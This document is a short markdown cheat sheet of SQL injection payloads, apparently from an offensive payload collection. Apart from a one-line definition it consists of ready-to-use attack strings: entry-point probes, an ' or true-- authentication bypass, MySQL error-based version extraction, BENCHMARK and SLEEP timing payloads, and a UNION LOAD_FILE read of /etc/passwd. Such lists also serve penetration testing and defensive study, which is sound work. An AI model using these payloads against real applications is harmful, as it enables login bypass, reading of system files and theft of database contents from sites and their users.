# SQL injection
A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application	

## Exploit

Detection of an SQL injection entry point
```
'
"
%27
" / %22
; / %3B
%%2727
%25%27
`+HERP
'||'DERP
'+'herp
' ' DERP
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```


Authentication bypass - use the file "Authentication Bypass.txt"
```
SELECT id FROM users WHERE username='input1' AND password='input2'
SELECT id FROM users WHERE username='' or true-- AND password='input2'
```


MySQL Error Based
```
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```


MySQL Blind SQL
```
+BENCHMARK(40000000,SHA1(1337))+
```


MySQL Read content of a file
```
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
```


Polyglot injection (multicontext)
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Thanks to
* http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/